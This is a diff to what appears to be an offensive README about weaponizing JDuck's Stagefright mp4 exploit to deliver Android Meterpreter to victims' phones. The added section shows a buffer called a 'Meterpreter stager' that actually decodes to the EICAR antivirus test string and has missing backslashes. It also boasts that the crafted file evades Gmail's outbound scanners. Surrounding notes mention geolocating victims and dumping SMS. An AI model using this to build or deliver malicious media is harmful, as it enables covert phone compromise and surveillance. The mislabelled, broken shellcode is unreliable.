@@ -33,6 +33,26 @@ payload/android/meterpreter/reverse_https (STAGED) or payload/android/meterprete
 
 payload, and tweaking JDuck's exploit to make it work. So this time, running the script will generate a infected mp4 file that has a instant Meterpreter upgrade.
 
+# Update: Replacing Shellcode = Failure
+
+Attempted to change the lines of shellcode to a 68-byte Android Meterpreter stager:
+
+    #rop += struct.pack('<L', 0xfeedfed5)          # top of stack...
+    # linux/armle/shell_reverse_tcp (modified to pass env and fork/exit)
+    # Modified to become a Meterpreter Stager
+    buf = ''
+    buf += 'x58\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a'
+    buf += 'x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24'
+    buf += 'x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44'
+    buf += 'x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53'
+    buf += 'x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a'
+  
+The encoding scheme used by mp4.py (the renamed python script originally made by JDuck) has worked perfectly (and it gets past gmail's outbound mail scanners)
+
+However, it failed to execute.
+
+According to the Line 141 of JDuck's code, the handler must be configured with payload/linux/armle/shell_reverse_tcp. Thats originally how it designed to work.
+
 # Notes and Disclaimers
 
 1. Be forewarned that non-rooted devices were discovered to have limited capabilities, as described in OPERATION SMOKE JAGUAR. You cannot GEOLOCATE a victim or do a SMS dump without having the devices rooted first
